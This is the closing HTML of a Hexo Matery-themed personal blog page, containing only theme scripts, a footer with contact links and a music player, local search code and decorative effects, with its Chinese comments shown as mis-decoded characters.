<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- æ˜¯å¦åŠ è½½ä½¿ç”¨è‡ªå¸¦çš„ prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>


<!-- ä»£ç è¯­è¨€ -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- ä»£ç å—å¤åˆ¶ -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- ä»£ç å—æ”¶ç¼© -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;ç›®å½•</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC æ‚¬æµ®æŒ‰é’®. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* ä¿®å¤æ–‡ç« å¡ç‰‡ div çš„å®½åº¦. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // åˆ‡æ¢TOCç›®å½•å±•å¼€æ”¶ç¼©çš„ç›¸å…³æ“ä½œ.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2025</span>
            
            <a href="/about" target="_blank">q1n9</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;ç«™ç‚¹æ€»å­—æ•°:&nbsp;<span
                        class="white-color">165.6k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;æ€»è®¿é—®é‡:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;æ€»è®¿é—®äººæ•°:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- è¿è¡Œå¤©æ•°æé†’. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/lingqing777" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1625684832@qq.com" class="tooltipped" target="_blank" data-tooltip="é‚®ä»¶è”ç³»æˆ‘" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1625684832" class="tooltipped" target="_blank" data-tooltip="QQè”ç³»æˆ‘: 1625684832" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS è®¢é˜…" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- æœç´¢é®ç½©æ¡† -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;æœç´¢</span>
            <input type="search" id="searchInput" name="s" placeholder="è¯·è¾“å…¥æœç´¢çš„å…³é”®å­—"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- ç™½å¤©å’Œé»‘å¤œä¸»é¢˜ -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- å›åˆ°é¡¶éƒ¨æŒ‰é’® -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    

    <!-- é›ªèŠ±ç‰¹æ•ˆ -->
     
        <script type="text/javascript">
            // åªåœ¨æ¡Œé¢ç‰ˆç½‘é¡µå¯ç”¨ç‰¹æ•ˆ
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
            }
        </script>
    

    <!-- é¼ æ ‡æ˜Ÿæ˜Ÿç‰¹æ•ˆ -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--è…¾è®¯å…”å°å·¢-->
    
    

    

    
    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
